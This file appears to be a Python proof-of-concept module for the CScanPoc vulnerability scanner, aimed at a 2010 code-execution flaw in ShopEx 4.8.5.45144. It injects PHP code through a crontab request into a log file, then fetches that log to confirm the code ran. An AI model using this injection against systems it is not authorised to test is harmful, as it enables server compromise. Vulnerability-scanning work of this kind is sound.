# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'ShopEx_0012' # 平台漏洞编号，留空
    name = 'ShopEx 4.8.5.45144 /core/include_v5/crontab.php 代码执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2010-06-15'  # 漏洞公布时间
    desc = '''
        ShopEx 4.8.5.45144 中的\core\include_v5\crontab.php中$this没任何过滤就将错误写入日志文件,且只对linux服务器有用
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-19798' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'ShopEx'  # 漏洞应用名称
    product_version = '4.8.5.45144'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '920d1294-094c-4e5b-a498-86b28cc09141'
    author = '国光'  # POC编写者
    create_date = '2018-05-09' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = """/?cron=1&action=1&p=1<?php%20echo%20md5(3.1415)?>"""
            shell_url = '{target}'.format(target=self.target)+'/home/logs/access.log.php'
            verify_url = '{target}'.format(target=self.target)+payload
            verify_req = urllib2.Request(verify_url)
            shell_req = urllib2.Request(shell_url)
            verify_response = urllib2.urlopen(verify_req)
            shell_response = urllib2.urlopen(shell_req)
            content = urllib2.urlopen(shell_url).read()
            if "63e1f04640e83605c1d177544a5a0488" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()